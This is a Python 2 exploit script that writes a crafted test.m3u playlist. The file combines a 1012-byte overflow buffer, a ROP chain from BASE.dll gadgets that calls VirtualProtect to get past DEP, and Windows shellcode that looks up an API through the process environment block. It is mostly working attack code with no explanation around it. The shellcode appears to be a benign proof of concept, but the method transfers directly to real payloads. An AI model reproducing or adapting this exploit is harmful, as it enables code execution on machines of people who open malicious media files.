import struct

p = open("test.m3u", "w")

SHELLCODE  = (
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x69\x21"
"\x21\x01\x68\x6e\x6d\x69\x6e\x68\x20\x68\x79\x75\x89\xe1\xfe"
"\x49\x0b\x31\xc0\x51\x50\xff\xd7"
)

BUFFER = "A" * 1012

# EDI = 0x1001dc05 / RETN
rop1 = struct.pack('<L', 0x100190b0) # POP EDIT # RETN
rop1 += struct.pack('<L', 0x1001dc05) # RETN [BASE.dll]

# ESI = [0x10040284] / &VirtualProtect()
rop2 = struct.pack('<L', 0x10015f82)  # POP EAX # RETN [BASE.dll]
rop2 += struct.pack('<L', 0x10040284) # PTR TO &VIRTUALPROTECT()
rop2 += struct.pack('<L', 0x1001eaf1) # MOV EAX, DWORD PTR DS:[EAX]
rop2 += struct.pack('<L', 0x10030950) # XCHG EAX,ESI # RETN [BASE.DLL]

# EBP = 0x1000d0ff / & JMP ESP
rop3 = struct.pack('<L',0x1001d748)  # POP EBP # RETN
rop3 += struct.pack('<L', 0x10022aa7) # & JMP ESP 

# EBX = 0x201 size
rop4 = struct.pack('<L',0x10015f82) # POP EAX # RETN
rop4 += struct.pack('<L',0xfffffdff) # (-)0X201
rop4 += struct.pack('<L', 0x10014db4) # NEG EAX # RETN
rop4 += struct.pack('<L',0x10032f32) # XCHG EAX,EBX # RETN 0X00

# EDX = 0x40 flag
rop5 = struct.pack('<L', 0x10015f82)   # POP EAX # RETN
rop5 += struct.pack('<L',0xffffffc0)  # 
rop5 += struct.pack('<L', 0x10014db4)  # NEG EAX # RETN
rop5 += struct.pack('<L', 0x10038a6d)  # XCHG EAX,EDX # RETN

# ECX = 0x1060d0ca / &writable address
rop6 = struct.pack('<L', 0x100163c7)   # POP ECX # RETN
rop6 += struct.pack('<L', 0x1060d0ca)  # &WRITABLE ADDRESS

# eax = 0x90909090 / NOP
rop7 = struct.pack('<L', 0x10015f82) # POP EAX # RETN
rop7 += struct.pack('<L', 0x90909090)

# PUSHAD
rop8 = struct.pack('<L', 0x1001d7a5) # PUSHAD # RETN

ROP_CHAIN = rop1 + rop2 + rop3 + rop4 + rop5 + rop6 + rop7 + rop8

payload = BUFFER + ROP_CHAIN + SHELLCODE

print "payload len is : ", len(payload)

p.write(payload)
p.close()
